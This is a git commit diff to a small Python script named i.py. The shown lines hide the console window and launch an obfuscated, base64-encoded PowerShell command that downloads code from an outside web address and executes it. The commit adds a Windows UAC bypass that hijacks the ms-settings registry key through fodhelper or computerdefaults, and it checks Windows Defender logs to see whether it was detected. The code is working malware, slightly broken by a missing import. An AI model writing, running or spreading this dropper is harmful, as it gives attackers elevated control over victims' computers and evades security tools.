004a034c54510d5ce4bf0a0a3733e7b671c71184
43a1723 <hai1723notgay@gmail.com>
2025-03-14 20:37:02 +0700

    Update i.py

--- a/i.py
+++ a/i.py
@@ -1,5 +1,49 @@
 import subprocess
 import ctypes
+import subprocess
+import ctypes
+import sys
+
+def UACbypass(method: int = 1) -> bool:
+    if GetSelf()[1]:
+        execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
+        if method == 1:
+            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
+            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
+            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+            execute("computerdefaults --nouacbypass")
+            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
+            if log_count_after > log_count_before:
+                return UACbypass(method + 1)
+        elif method == 2:
+            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
+            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
+            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+            execute("fodhelper --nouacbypass")
+            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
+            if log_count_after > log_count_before:
+                return UACbypass(method + 1)
+        else:
+            return False
+        return True
+
+def IsAdmin() -> bool:
+    return ctypes.windll.shell32.IsUserAnAdmin() == 1
+
+def GetSelf() -> tuple[str, bool]:
+    if hasattr(sys, "frozen"):
+        return (sys.executable, True)
+    else:
+        return (__file__, False)
+
+
+if not IsAdmin():
+    if GetSelf()[1]:
+        if UACbypass():
+            os.kill(os.getpid(), 15)
+          
 ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 cmd = 'cmd.exe /k powershell -ExecutionPolicy Bypass -e aQB3AHIAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAG8AZABlAGYAbwByAGYAdQBuAC4AdgBlAHIAYwBlAGwALgBhAHAAcAAvAHMAaQBnAG0AYQAnACkAIAB8ACAAaQBlAHgA'
 subprocess.Popen(cmd, shell=True)
